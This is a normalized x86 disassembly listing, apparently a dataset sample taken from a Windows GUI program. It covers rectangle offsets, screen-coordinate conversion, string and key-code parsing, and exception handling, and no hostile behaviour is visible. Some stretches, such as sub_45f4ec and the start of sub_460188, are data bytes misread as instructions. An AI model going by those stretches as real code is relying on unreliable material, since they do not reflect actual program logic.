call sub_43c9f8
call sub_45c840
mov edx [ ebx ]
cmp eax [ edx + 0x60 ]
jne r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x58 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x54 ] eax
call sub_45ed60
add [ ebp - 0x54 ] eax
mov eax [ rw-data ]
call sub_45bc04
mov [ ebp - 0x50 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x5c ]
mov [ ebp - 0x4c ] eax
lea edx [ ebp - 0x80 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_43daec
lea esi [ ebp - 0x80 ]
lea edi [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x14 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
mov eax [ ebx ]
mov esi [ eax + 0x60 ]
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
jmp r-xdata
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
call OffsetRect
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0xc ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_43dc90
mov eax [ ebp - 0x88 ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp - 0x84 ]
mov [ ebp - 0x34 ] eax
lea edx [ ebp - 0x90 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_45c808
mov eax [ ebp - 0x90 ]
lea edx [ ebp - 0x8c ]
call sub_43b218
mov edx [ ebp - 0x8c ]
lea eax [ ebp - 0x28 ]
call sub_404078
xor eax eax
mov [ ebp - 0x30 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x74 ]
mov [ ebp - 0x2c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x5c ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0x60 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
xor ecx ecx
mov edx 0xb030
call sub_43f334
test eax eax
sete [ ebp - 0x1d ]
cmp [ ebp - 0x1d ] 0x0
je r-xdata
cmp [ esi + 0x190 ] 0x0
je r-xdata
cmp [ ebp - 0x1d ] 0x0
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x132 ] 0x0
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov eax [ esi + 0x190 ]
push eax
call ClientToScreen
xor eax eax
jmp r-xdata
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
jne r-xdata
lea eax [ ebp - 0x60 ]
push eax
lea ecx [ ebp - 0x1d ]
lea edx [ ebp - 0x28 ]
mov esi [ ebx ]
mov eax [ esi + 0x134 ]
call [ esi + 0x130 ]
mov edx [ ebx ]
mov [ edx + 0x58 ] al
mov eax [ ebx ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
mov al 0x1
cmp [ ebp - 0x28 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x5c ]
call sub_45eeb4
pop ecx
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov dl [ eax + 0x5f ]
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x50 ]
mov esi [ eax ]
call [ esi + 0xd8 ]
mov eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
call OffsetRect
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov si 0xffc8
call sub_40348c
test al al
je r-xdata
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x48 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_43dc64
mov eax [ ebx ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x64 ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x68 ] edx
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x40 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_43dc64
mov eax [ ebx ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x6c ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x70 ] edx
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov edx [ ebp - 0x4c ]
call sub_43e2ec
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ ebp - 0x28 ]
lea edx [ ebp - 0x70 ]
mov esi [ eax ]
call [ esi + 0xd4 ]
call sub_45c954
mov eax [ ebp - 0x30 ]
test eax eax
jle r-xdata
push ebp
mov eax [ ebp - 0x28 ]
call sub_45ef14
pop ecx
add eax 0x5
sub [ ebp - 0x70 ] eax
sub [ ebp - 0x68 ] eax
mov cl 0x1
mov edx [ ebp - 0x2c ]
mov eax [ ebx ]
call sub_45eb30
jmp r-xdata
xor ecx ecx
mov edx eax
mov eax [ ebx ]
call sub_45eb30
jmp r-xdata
sub_45f354
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ rw-data ]
mov ebx [ eax + 0x68 ]
test ebx ebx
je r-xdata
mov eax edi
mov edx [ esi + 0x50 ]
call sub_404034
cmp [ ebx + 0x23c ] 0x0
je r-xdata
mov eax edi
mov edx [ ebx + 0x23c ]
call sub_404034
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_45f390
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx ecx
mov [ esp ] edx
mov esi eax
mov eax [ rw-data ]
mov edi [ eax + 0x6c ]
test edi edi
je r-xdata
mov ebp [ esi + 0x44 ]
cmp edi ebp
je r-xdata
push ebx
xor ecx ecx
mov edx [ esp + 0x4 ]
mov eax edi
call sub_43f334
dec eax
je r-xdata
xor eax eax
jmp r-xdata
test ebp ebp
je r-xdata
mov al 0x1
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x0
jne r-xdata
push ebx
xor ecx ecx
mov edx [ esp + 0x4 ]
mov eax ebp
call sub_43f334
dec eax
je r-xdata
mov al [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x60 ] 0x0
je r-xdata
cmp [ ebx + 0x42 ] 0x0
setne dl
mov eax ebx
call sub_44ab30
sub_45f420
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0xc2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_45f448
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0xca ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_45f4ec
add [ eax ] eax
add [ eax ] al
dec esp
sub eax 0xa5300047
inc ebx
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_45f54f
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f556
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_454fa4
mov eax sub_455224
call sub_4135a8
mov eax [ rw-data ]
push eax
call CloseHandle
sub_45f5ac
push ebx
push esi
push edi
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov [ esp ] 0x0
mov eax esi
call sub_4042a0
cmp edi eax
jg r-xdata
mov eax esi
call sub_4042a0
cmp edi eax
jle r-xdata
mov al [ esi + edi - 0x1 ]
mov [ esp ] al
mov edx edi
mov eax esi
call sub_40be44
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
cmp edi 0x1
jle r-xdata
mov bl 0x1
jmp r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
cmp al [ rw-data ]
jne r-xdata
cmp [ esi + edi - 0x2 ] 0x5c
jne r-xdata
mov eax esi
call sub_4042a0
cmp eax 0x4
jl r-xdata
mov eax esi
call sub_4042a0
cmp eax 0x4
jl r-xdata
mov edx edi
dec edx
mov eax esi
call sub_40be44
test al al
jne r-xdata
mov al [ esp ]
sub al 0x2f
je r-xdata
mov eax esi
call sub_4042a0
sub eax 0x4
cmp edi eax
jle r-xdata
mov eax esi
call sub_4042a0
sub eax 0x4
cmp edi eax
jle r-xdata
cmp edi 0x2
jle r-xdata
mov bl 0x2
jmp r-xdata
sub al 0xb
jne r-xdata
mov al [ esi + edi - 0x2 ]
cmp al [ rw-data ]
jne r-xdata
mov bl 0x6
jmp r-xdata
mov bl 0x1
jmp r-xdata
cmp [ esi + edi - 0x3 ] 0x5c
jne r-xdata
mov al [ esp ]
sub al 0x21
je r-xdata
cmp edi 0x2
jle r-xdata
mov edx edi
sub edx 0x2
mov eax esi
call sub_40be44
test al al
je r-xdata
mov bl 0x3
jmp r-xdata
sub al 0x1b
je r-xdata
mov bl 0x7
jmp r-xdata
cmp [ esi + edi - 0x3 ] 0x5c
jne r-xdata
sub al 0x2
je r-xdata
mov edx edi
sub edx 0x2
mov eax esi
call sub_40be44
cmp al 0x2
jne r-xdata
sub al 0x1e
jne r-xdata
mov al [ esp ]
sub al 0x23
je r-xdata
mov bl 0x5
jmp r-xdata
sub al 0x16
je r-xdata
sub al 0x28
je r-xdata
sub al 0x2
je r-xdata
sub al 0x9
jne r-xdata
mov al [ esp ]
sub al 0x30
je r-xdata
mov bl 0x4
sub al 0x11
je r-xdata
sub al 0x2
je r-xdata
sub al 0x9
jne r-xdata
sub_45f700
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov bl [ r-xdata ]
mov eax edi
call sub_4042a0
mov esi eax
test esi esi
jle r-xdata
mov edx [ esp ]
mov eax edi
call sub_45f5ac
cmp al 0x1
jne r-xdata
mov ebp 0x1
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
or bl 0x8
cmp al 0x3e
jne r-xdata
or bl 0x1
jmp r-xdata
cmp al 0x3c
jne r-xdata
cmp ebp [ esp ]
jge r-xdata
inc ebp
dec esi
jne r-xdata
cmp ebp [ esp ]
jge r-xdata
and bl 0xfb
cmp ebp 0x1
jle r-xdata
mov al [ edi + ebp - 0x1 ]
cmp al 0x21
jne r-xdata
and bl 0xfd
or bl 0x4
or bl 0x2
jmp r-xdata
cmp [ edi + ebp - 0x2 ] 0x3c
je r-xdata
sub_45f77c
mov edx eax
sub al 0x2f
je r-xdata
mov edx [ rw-data ]
mov dl [ edx ]
sub al 0xb
jne r-xdata
mov eax edx
retn
mov edx [ rw-data ]
mov dl [ edx ]
mov eax edx
retn
sub_45f79c
push ebp
mov ebp esp
push ecx
mov ecx 0x6
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
mov [ ebp - 0x5 ] cl
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_45f9a6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx esi
call sub_404034
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_45f700
mov [ ebp - 0x11 ] al
test [ ebp - 0x11 ] 0x1
jne r-xdata
mov eax [ ebx ]
call sub_4042a0
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_4042a0
dec eax
test eax eax
jl r-xdata
mov [ ebp - 0x10 ] 0x1
mov eax [ ebp - 0x4 ]
call sub_4042a0
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f9ad
lea eax [ ebp - 0x38 ]
mov edx 0x8
call sub_404004
retn
inc eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0x18 ] eax
mov esi 0x1
add al 0xfc
sub al 0x2
jae r-xdata
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx ]
mov ecx [ ebp - 0x10 ]
mov edx 0x1
call sub_404500
push [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
mov al [ eax + esi - 0x1 ]
call sub_45f77c
mov edx eax
lea eax [ ebp - 0x30 ]
call sub_4041c8
push [ ebp - 0x30 ]
lea eax [ ebp - 0x34 ]
push eax
mov eax [ ebx ]
call sub_4042a0
mov ecx eax
sub ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x10 ]
inc edx
mov eax [ ebx ]
call sub_404500
push [ ebp - 0x34 ]
mov eax ebx
mov edx 0x3
call sub_404360
jmp r-xdata
add al 0xfc
sub al 0x2
jae r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov ecx [ ebp - 0x10 ]
dec ecx
mov eax [ ebx ]
mov edx 0x1
call sub_404500
push [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
mov al [ eax + esi - 0x1 ]
call sub_45f77c
mov edx eax
lea eax [ ebp - 0x20 ]
call sub_4041c8
push [ ebp - 0x20 ]
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebx ]
call sub_4042a0
mov ecx eax
sub ecx [ ebp - 0x10 ]
inc ecx
mov eax [ ebx ]
mov edx [ ebp - 0x10 ]
call sub_404500
push [ ebp - 0x24 ]
mov eax ebx
mov edx 0x3
call sub_404360
inc [ ebp - 0x10 ]
jmp r-xdata
inc [ ebp - 0xc ]
dec [ ebp - 0x18 ]
jne r-xdata
cmp [ ebp - 0x10 ] 0x1
jge r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
mov eax [ ebx ]
call sub_4042a0
cmp eax [ ebp - 0x10 ]
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_4042a0
mov esi eax
sub esi [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_45f5ac
mov edx eax
dec edx
sub dl 0x2
jae r-xdata
dec [ ebp - 0x10 ]
lea eax [ ebp - 0x38 ]
mov dl [ ebp - 0x5 ]
call sub_4041c8
mov edx [ ebp - 0x38 ]
mov ecx [ ebx ]
mov eax ebx
call sub_4042ec
jmp r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_45f5ac
mov edx eax
dec edx
sub dl 0x2
jae r-xdata
jmp r-xdata
inc [ ebp - 0x10 ]
lea eax [ ebp - 0x28 ]
mov dl [ ebp - 0x5 ]
call sub_4041c8
mov edx [ ebp - 0x28 ]
mov eax ebx
call sub_4042a8
sub_45f9b8
push ebx
push esi
push edi
push ebp
push ecx
mov esi eax
mov [ esp ] 0x1
mov eax esi
call sub_4042a0
cmp eax 0x4
jl r-xdata
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
or ebp 0xffffffff
or edi 0xffffffff
mov eax esi
call sub_4042a0
mov ebx eax
dec ebx
test ebx ebx
jle r-xdata
test ebp ebp
jge r-xdata
test edi edi
jge r-xdata
mov eax esi
call sub_4042a0
sub eax 0x4
cmp ebx eax
jl r-xdata
mov edi ebx
mov ebp ebx
jmp r-xdata
test edi edi
jle r-xdata
mov edi ebp
test edi edi
jl r-xdata
mov eax esi
call sub_4042a0
cmp edi eax
je r-xdata
mov edx ebx
mov eax esi
call sub_45f5ac
cmp al 0x6
jne r-xdata
mov al [ esi + edi ]
cmp al [ rw-data ]
sete al
xor al 0x1
mov [ esp ] al
sub_45fa3c
push ebx
push esi
mov esi eax
mov bl [ rw-data ]
mov eax esi
call sub_4042a0
cmp eax 0x4
jl r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax esi
call sub_4042a0
mov edx eax
dec edx
mov eax esi
call sub_45f5ac
cmp al 0x6
jne r-xdata
mov eax esi
call sub_4042a0
mov edx eax
sub edx 0x2
mov eax esi
call sub_45f5ac
cmp al 0x6
je r-xdata
mov eax esi
call sub_4042a0
mov bl [ esi + eax - 0x1 ]
mov eax esi
call sub_4042a0
mov edx eax
sub edx 0x3
mov eax esi
call sub_45f5ac
cmp al 0x6
jne r-xdata
sub_45faa8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_45fb25
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_403fe0
mov esi ebx
test esi esi
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45fb2c
lea eax [ ebp - 0x8 ]
call sub_403fe0
retn
mov ebx 0x1
inc ebx
dec esi
jne r-xdata
add al 0xfd
sub al 0x2
jb r-xdata
mov edx ebx
mov eax edi
call sub_45f5ac
sub al 0x3
je r-xdata
lea eax [ ebp - 0x8 ]
mov dl [ edi + ebx - 0x1 ]
call sub_4041c8
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4042a8
mov eax [ ebp - 0x4 ]
sub_45fb34
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45fb79
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_45faa8
mov eax [ ebp - 0x4 ]
call sub_4042a0
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45fb80
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
sub_45fb88
push ebx
push esi
push edi
push ebp
push ecx
mov ebx edx
mov edi eax
mov eax edi
call sub_4042a0
mov edx eax
mov eax edi
call sub_45fb34
cmp eax ebx
jge r-xdata
xor ebp ebp
mov [ esp ] ebx
mov eax edi
call sub_4042a0
mov ebx eax
test ebx ebx
jle r-xdata
or ebp 0xffffffff
jmp r-xdata
mov eax ebp
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov esi 0x1
inc esi
dec ebx
jne r-xdata
dec [ esp ]
cmp [ esp ] 0x0
jl r-xdata
inc ebp
mov edx esi
mov eax edi
call sub_45f5ac
cmp al 0x3
je r-xdata
sub_45fbe4
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax esi
call sub_45fb88
test eax eax
jl r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov edx eax
mov eax esi
call sub_45f5ac
dec eax
sub al 0x2
setb bl
sub_45fc0c
push ebp
mov ebp esp
push ecx
mov ecx 0x4
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov edi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
mov esi [ ebp + 0x14 ]
xor eax eax
push ebp
push sub_45fd91
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
sub eax [ ebp - 0x8 ]
cmp eax [ ebp + 0x10 ]
jge r-xdata
mov eax esi
sub eax [ ebp - 0x8 ]
cmp eax [ ebp + 0x10 ]
jle r-xdata
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_45f700
mov [ ebp - 0x9 ] al
mov eax esi
dec eax
mov [ ebp - 0x10 ] eax
test [ ebp - 0x9 ] 0x1
je r-xdata
mov eax ebx
mov edx edi
call sub_404034
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_45f700
mov [ ebp - 0x9 ] al
test [ ebp - 0x9 ] 0x1
je r-xdata
push ebx
mov ecx [ ebp - 0x10 ]
mov edx 0x1
mov eax edi
call sub_404500
sub esi [ ebp - 0x8 ]
mov eax [ ebp + 0x10 ]
sub eax esi
test eax eax
jle r-xdata
mov eax [ ebp - 0x8 ]
dec eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x24 ]
push eax
mov eax edi
call sub_4042a0
mov ecx eax
mov edx esi
mov eax edi
call sub_404500
mov eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx [ ebp - 0x8 ]
add ecx [ ebp + 0x10 ]
dec ecx
mov edx 0x1
mov eax edi
call sub_404500
mov edx [ ebp - 0x28 ]
mov eax ebx
pop ecx
call sub_4042ec
jmp r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov eax edi
call sub_4042a0
mov ecx eax
mov edx esi
sub edx [ ebp + 0x10 ]
mov eax edi
call sub_404500
mov eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebp - 0x8 ]
dec ecx
mov edx 0x1
mov eax edi
call sub_404500
mov edx [ ebp - 0x20 ]
mov eax ebx
pop ecx
call sub_4042ec
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov eax edi
call sub_4042a0
mov ecx eax
mov edx [ ebp - 0x10 ]
inc edx
mov eax edi
call sub_404500
mov edx [ ebp - 0x18 ]
mov eax ebx
call sub_4042a8
jmp r-xdata
mov esi eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45fd98
lea eax [ ebp - 0x28 ]
mov edx 0x6
call sub_404004
retn
lea eax [ ebp - 0x14 ]
mov dl [ ebp + 0xc ]
call sub_4041c8
mov edx [ ebp - 0x14 ]
mov eax ebx
call sub_4042a8
dec esi
jne r-xdata
sub_45fda4
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1 ] cl
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_45ff6a
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax ebx
mov edx edi
call sub_404034
mov eax esi
call sub_4042a0
test eax eax
jle r-xdata
mov eax esi
call sub_4042a0
mov edx eax
mov eax esi
call sub_45fb34
mov edi eax
mov eax [ ebx ]
call sub_4042a0
cmp edi eax
je r-xdata
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x1
mov eax [ ebx ]
call sub_4042a0
test eax eax
jle r-xdata
mov eax [ ebx ]
call sub_4042a0
inc eax
push eax
sub edi [ ebp - 0x8 ]
push edi
mov al [ ebp - 0x1 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx [ ebp - 0x8 ]
inc ecx
mov edx [ ebx ]
mov eax esi
call sub_45fc0c
mov edx [ ebp - 0x28 ]
mov eax ebx
call sub_404034
inc [ ebp - 0x14 ]
dec [ ebp - 0x18 ]
jne r-xdata
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_45fb34
mov [ ebp - 0x10 ] eax
mov eax [ ebx ]
call sub_4042a0
inc eax
mov [ ebp - 0xc ] eax
mov edi [ ebp - 0x8 ]
inc edi
mov eax [ ebx ]
call sub_4042a0
sub eax edi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ff71
lea eax [ ebp - 0x28 ]
mov edx 0x3
call sub_404004
retn
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x10 ] 0x1
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_45f5ac
dec eax
sub al 0x2
jae r-xdata
mov eax [ ebx ]
call sub_4042a0
cmp eax [ ebp - 0xc ]
jge r-xdata
inc eax
mov [ ebp - 0x1c ] eax
inc [ ebp - 0x10 ]
dec [ ebp - 0x18 ]
jne r-xdata
mov edx [ ebp - 0x10 ]
dec edx
mov eax esi
call sub_45fbe4
test al al
jne r-xdata
mov eax [ ebp - 0xc ]
push eax
mov edi [ ebp - 0x8 ]
inc edi
mov eax [ ebp - 0x10 ]
sub eax edi
push eax
mov al [ ebp - 0x1 ]
push eax
lea eax [ ebp - 0x24 ]
push eax
mov ecx edi
mov edx [ ebx ]
mov eax esi
call sub_45fc0c
mov edx [ ebp - 0x24 ]
mov eax ebx
call sub_404034
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x14 ]
mov al [ esi + eax - 0x1 ]
call sub_45f77c
mov edx eax
lea eax [ ebp - 0x20 ]
call sub_4041c8
mov edx [ ebp - 0x20 ]
mov eax ebx
call sub_4042a8
inc edi
dec [ ebp - 0x1c ]
jne r-xdata
mov [ ebp - 0xc ] edi
jmp r-xdata
mov eax [ ebx ]
mov edx [ ebp - 0x10 ]
cmp [ eax + edx - 0x1 ] 0x20
jne r-xdata
mov eax ebx
call j_sub_4044ac
mov edx [ ebp - 0x10 ]
mov cl [ ebp - 0x1 ]
mov [ eax + edx - 0x1 ] cl
mov eax [ ebp - 0x14 ]
mov al [ esi + eax - 0x1 ]
call sub_45f77c
mov edx [ ebx ]
cmp al [ edx + edi - 0x1 ]
jne r-xdata
sub_45ff7c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45ffa1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ffa8
retn
sub_460188
mov ebx 0xb4ffbaff
add eax [ esi ]
rol [ ebx ] 0x1
inc esi
add [ eax ] dh
add al 0x46
add [ esi + eax + 0x6e80046 ] dh
inc esi
add [ eax ] dh
adc eax [ esi ]
mov [ esi + eax * 2 ] dl
add al al
adc eax [ esi ]
push eax
adc al 0x46
add [ eax + 0x2 ] cl
inc esi
add [ eax ] ch
add eax [ esi ]
js r-xdata
push esp
inc ebx
jne r-xdata
inc esi
add [ edi ] cl
add eax 0x0
je r-xdata
add esp 0xc
mov eax esi
pop esi
pop ebx
retn
pop [ fs : 0x0 ]
insd
dec ebp
popad
jae r-xdata
pop [ 0x0 ]
inc ebp
imul esi [ fs : eax + edx * 8 + 0x1 ] 0xf070046
push esp
inc ebx
jne r-xdata
push esi
je r-xdata
mov eax ebx
call sub_4607d0
test al al
je r-xdata
mov edx esi
mov cl [ esp ]
mov eax ebx
call sub_443794
push ecx
mov [ esp ] cl
mov esi edx
mov ebx eax
cmp [ ebx + 0x23c ] 0x0
jne r-xdata
add [ ebx + 0x56 ] dl
insd
dec ebp
popad
jae sub_460248
pop edx
pop esi
pop ebx
retn
cmp [ esi ] 0x0
je r-xdata
inc ebp
imul esi [ fs : esp + ebx * 2 ] 0x1df00046
inc ebx
add [ eax + eax ] cl
add al 0x4d
popad
jae r-xdata
test [ esp ] 0x2
jne r-xdata
add [ eax ] al
mov eax eax
cmp [ esi ] 0x25
je r-xdata
mov dx [ esi ]
mov cl [ esp ]
mov eax ebx
call sub_460eac
test [ esp ] 0x1
jne r-xdata
cmp [ esi ] 0x27
jne r-xdata
test [ esp ] 0x4
jne r-xdata
cmp [ esi ] 0x26
je r-xdata
mov [ esi ] 0x0
jmp r-xdata
mov [ esi ] 0x0
jmp r-xdata
cmp [ esi ] 0x28
jne r-xdata
cmp [ esi ] 0x24
je r-xdata
mov dx [ esi ]
mov cl [ esp ]
mov eax ebx
call sub_461144
mov [ esi ] 0x0
jmp r-xdata
cmp [ esi ] 0x23
jne r-xdata
cmp [ esi ] 0x2e
jne r-xdata
cmp [ esi ] 0x8
jne r-xdata
test [ esp ] 0x1
je r-xdata
mov eax ebx
call sub_460c60
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe8 ]
test al al
je r-xdata
mov [ esi ] 0x0
jmp r-xdata
mov dx [ esi ]
mov eax ebx
call sub_461214
sub_4601f4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_434a20
mov al [ r-xdata ]
mov [ esi + 0x22d ] al
mov eax [ rw-data ]
mov al [ eax ]
mov [ esi + 0x224 ] al
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035b4
mov eax esi
pop esi
pop ebx
retn
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_460248
push ebx
push esi
push ecx
mov [ esp ] cl
mov esi edx
mov ebx eax
cmp [ ebx + 0x23c ] 0x0
jne r-xdata
mov eax ebx
call sub_4607d0
test al al
je r-xdata
mov edx esi
mov cl [ esp ]
mov eax ebx
call sub_443794
pop edx
pop esi
pop ebx
retn
cmp [ esi ] 0x0
je r-xdata
test [ esp ] 0x2
jne r-xdata
cmp [ esi ] 0x25
je r-xdata
mov dx [ esi ]
mov cl [ esp ]
mov eax ebx
call sub_460eac
test [ esp ] 0x1
jne r-xdata
cmp [ esi ] 0x27
jne r-xdata
test [ esp ] 0x4
jne r-xdata
cmp [ esi ] 0x26
je r-xdata
mov [ esi ] 0x0
jmp r-xdata
mov [ esi ] 0x0
jmp r-xdata
cmp [ esi ] 0x28
jne r-xdata
cmp [ esi ] 0x24
